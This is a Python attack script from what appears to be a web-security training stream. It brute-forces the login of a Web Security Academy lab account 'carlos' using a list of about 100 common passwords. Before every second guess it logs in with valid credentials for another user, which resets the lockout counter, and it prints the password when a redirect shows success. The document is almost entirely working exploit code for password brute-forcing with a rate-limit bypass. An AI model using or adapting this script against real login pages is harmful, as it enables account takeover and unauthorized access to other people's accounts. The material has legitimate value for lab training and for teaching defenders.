#MDISEC TWİTCH Highlight: Web Security 0x11 | Authentication


import requests

def unlock_ban():
    
    burp0_url = "https://0a73002004c4a7c58183ca40007f00d4.web-security-academy.net:443/login"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://0a73002004c4a7c58183ca40007f00d4.web-security-academy.net", "Referer": "https://0a73002004c4a7c58183ca40007f00d4.web-security-academy.net/login", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers"}
    burp0_data = {"username": "wiener", "password": "peter"}
    res = requests.post(burp0_url, headers=burp0_headers,  data=burp0_data, allow_redirects=False)
    if res.status_code == 302:
        print("ban unlock..")


def brute_force(password):
    print("DENEME:{0}".format(password))

    session = requests.session()

    burp0_url = "https://0a73002004c4a7c58183ca40007f00d4.web-security-academy.net:443/login"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://0a73002004c4a7c58183ca40007f00d4.web-security-academy.net", "Referer": "https://0a73002004c4a7c58183ca40007f00d4.web-security-academy.net/login", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers", "Connection": "close"}
    burp0_data = {"username": "carlos", "password": password}
    code = session.post(burp0_url, headers=burp0_headers,  data=burp0_data,allow_redirects=False)
    return code.status_code

passwords = [ '123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567', 'dragon', '123123', 'baseball', 'abc123', 'football', 'monkey', 'letmein', 'shadow', 'master', '666666', 'qwertyuiop', '123321', 'mustang', '1234567890', 'michael', '654321', 'superman', '1qaz2wsx', '7777777', '121212', '000000', 'qazwsx', '123qwe', 'killer', 'trustno1', 'jordan', 'jennifer', 'zxcvbnm', 'asdfgh', 'hunter', 'buster', 'soccer', 'harley', 'batman', 'andrew', 'tigger', 'sunshine', 'iloveyou', '2000', 'charlie', 'robert', 'thomas', 'hockey', 'ranger', 'daniel', 'starwars', 'klaster', '112233', 'george', 'computer', 'michelle', 'jessica', 'pepper', '1111', 'zxcvbn', '555555', '11111111', '131313', 'freedom', '777777', 'pass', 'maggie', '159753', 'aaaaaa', 'ginger', 'princess', 'joshua', 'cheese', 'amanda', 'summer', 'love', 'ashley', 'nicole', 'chelsea', 'biteme', 'matthew', 'access', 'yankees', '987654321', 'dallas', 'austin', 'thunder', 'taylor', 'matrix', 'mobilemail', 'mom', 'monitor', 'monitoring', 'montana', 'moon', 'moscow']

unlock_ban()
for attempt, password in enumerate(passwords):
    if attempt % 2 == 0:
        unlock_ban()
    code = brute_force(password)
    if code == 302:
        print("password:{0}".format(password))
        break